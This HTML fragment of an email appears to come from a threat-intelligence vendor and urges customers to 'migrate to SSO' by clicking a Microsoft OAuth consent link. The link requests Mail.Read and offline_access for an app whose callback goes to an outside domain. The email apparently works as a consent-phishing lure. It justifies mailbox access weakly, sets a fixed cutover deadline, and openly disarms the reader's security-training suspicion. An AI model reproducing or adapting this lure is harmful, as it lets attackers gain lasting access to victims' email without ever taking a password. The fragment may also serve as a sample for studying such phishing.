<h3>2. Why SSO Migration, and What It Grants</h3>
<p>The 2026 credential-stuffing wave against TI vendor portals pushed us to federated identity. The
migration connects your existing Microsoft work account to the portal through Microsoft's own
identity platform — <b>the sign-in happens entirely on Microsoft's login page
(login.microsoftonline.com), and we never see your password</b>. The connector requests:</p>
<ul>
<li><code>openid</code> / <code>profile</code> — identify the seat holder</li>
<li><code>offline_access</code> — keep the feed session alive across token rotation (required for TAXII polling)</li>
<li><code>Mail.Read</code> — deliver daily report digests into the seat holder's mailbox instead of a separate inbox to check</li>
</ul>

<h3>3. Migration Steps (2 minutes, per seat)</h3>
<p style="text-align:center;margin:18px 0">
<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8f41c2a7-55d0-4b2e-9c1f-vulpecula01&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Fvulpecula-customers.example%2Fsso%2Fcallback&amp;scope=openid+profile+offline_access+Mail.Read" style="display:inline-block;background:#283593;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Start Portal SSO Migration</a>
</p>
<p style="font-size:13px;color:#666;text-align:center">Vendor portal: https://portal.vulpecula.example/sso (migration wizard also reachable from the portal menu)</p>

<h3>4. Timeline</h3>
<ul>
<li>Renewal PO due: <b>January 24</b> (procurement contact: see Reference)</li>
<li>SSO migration cutover: <b>January 31</b> — legacy passwords disabled, unmigrated feeds pause</li>
<li>API keys (<code>vpk_…</code>): re-issued automatically at migration; old keys expire at cutover</li>
<li>Paused feeds resume within 4 hours of migration, no backfill gap</li>
</ul>

<p style="font-size:14px;background:#E8EAF6;padding:12px">A vendor email asking you to approve an app
consent is exactly what your own security training warns about — your wariness is correct, so here is how
to check us: the consent screen will name <b>"Vulpecula Feed Connector"</b> as the application and show
<b>your own tenant name</b> as the audience; anything else, abort. You can also reach the same wizard from
inside the portal you already use (address above). The January 31 cutover, however, is fixed across all
Enterprise accounts — we cannot hold feeds open for individual tenants.</p>

